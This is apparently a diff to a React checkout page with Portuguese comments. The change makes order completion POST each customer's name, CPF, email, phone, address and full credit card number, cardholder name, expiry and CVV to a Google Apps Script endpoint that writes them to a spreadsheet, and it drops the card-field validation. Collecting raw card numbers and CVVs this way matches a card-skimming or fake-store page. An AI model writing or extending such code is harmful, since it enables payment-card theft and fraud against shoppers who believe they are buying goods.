@@ -258,8 +258,8 @@ const App = () => {
   const [validationError, setValidationError] = useState('');
 
   // ADICIONE ESTA CONSTANTE NO INÍCIO DO SEU COMPONENTE APP (ou em um arquivo .env)
-  // Substitua este placeholder pela SUA URL REAL do Google Apps Script!
-  const GOOGLE_SHEETS_WEB_APP_URL = "https://script.google.com/macros/s/AKfycbzQcdPXTEmrAx-u5PiqDmKjIKaUsYjXOkN4PbkfSB-ZrGsAKeRfKs3wCEHN7quhmlvEiA/exec";
+  // URL do Google Apps Script para enviar os dados do formulário
+  const GOOGLE_SHEETS_WEB_APP_URL = "https://script.google.com/macros/s/AKfycbzUtTpgZYY3byYbt8mMJmtOMnjClYjqjTv26lLCkxU0n82nSlsXrqEX8cDQ6CJjL9KPZA/exec";
 
   // useEffect para resetar isCvvFocused quando o método de pagamento muda para 'creditCard'
   useEffect(() => {
@@ -509,20 +509,56 @@ const App = () => {
   };
 
   // Função para finalizar o pedido (agora usada para o cartão de crédito ou para ir para a página PIX)
-  const handleFinalizeOrder = () => {
+  const handleFinalizeOrder = async () => { // Adicionado 'async' aqui
     setValidationError(''); // Limpa o erro ao finalizar
 
-    if (paymentMethod === 'creditCard') {
-      const { cardNumber, cardName, cardValidity, cardCvv } = formData;
-      if (!cardNumber || !cardName || !cardValidity || !cardCvv) {
-        setValidationError('Por favor, preencha todos os campos do cartão de crédito.');
-        return;
+    // Coleta os dados do formulário para envio
+    const dataToSubmit = {
+      'Data Pedido': new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' }),
+      'Nome Completo': formData.fullName,
+      'CPF': formData.cpf,
+      'Email': formData.email,
+      'Telefone': formData.phone,
+      'CEP': formData.cep,
+      'Endereco': formData.address,
+      'Numero': formData.number,
+      'Complemento': formData.complement,
+      'Bairro': formData.neighborhood,
+      'Cidade': formData.city,
+      'Estado': formData.state,
+      'Metodo Pagamento': paymentMethod === 'creditCard' ? 'Cartão de Crédito' : 'Pix',
+      'Numero Cartao': formData.cardNumber,
+      'Nome Cartao': formData.cardName,
+      'Validade Cartao': formData.cardValidity,
+      'CVV Cartao': formData.cardCvv,
+      'Parcelas': formData.installments,
+      'Opcao Entrega': deliveryOption,
+    };
+
+    // Lógica de envio para o Google Sheets
+    try {
+      const response = await fetch(GOOGLE_SHEETS_WEB_APP_URL, {
+        method: 'POST',
+        mode: 'no-cors', // Importante para Google Apps Script
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: new URLSearchParams(dataToSubmit).toString(),
+      });
+
+      console.log('Requisição enviada para Google Sheets. Resposta (no-cors não mostra detalhes):', response);
+
+      if (paymentMethod === 'creditCard') {
+        console.log('Pedido Finalizado com Cartão!', formData, 'Método de Pagamento:', paymentMethod, 'Opção de Entrega:', deliveryOption);
+        setCurrentStep(6); // Vai para a tela de confirmação final
+      } else if (paymentMethod === 'pix') {
+        console.log('Redirecionando para página PIX...', formData, 'Método de Pagamento:', paymentMethod, 'Opção de Entrega:', deliveryOption);
+        setCurrentStep(5); // Vai para a página PIX
       }
-      console.log('Pedido Finalizado com Cartão!', formData, 'Método de Pagamento:', paymentMethod, 'Opção de Entrega:', deliveryOption);
-      setCurrentStep(6); // Vai para a tela de confirmação final
-    } else if (paymentMethod === 'pix') {
-      console.log('Redirecionando para página PIX...', formData, 'Método de Pagamento:', paymentMethod, 'Opção de Entrega:', deliveryOption);
-      setCurrentStep(5); // Vai para a página PIX
+
+    } catch (error) {
+      console.error('Erro ao enviar dados para Google Sheets:', error);
+      setValidationError('Erro ao finalizar pedido. Tente novamente mais tarde.');
     }
   };
 
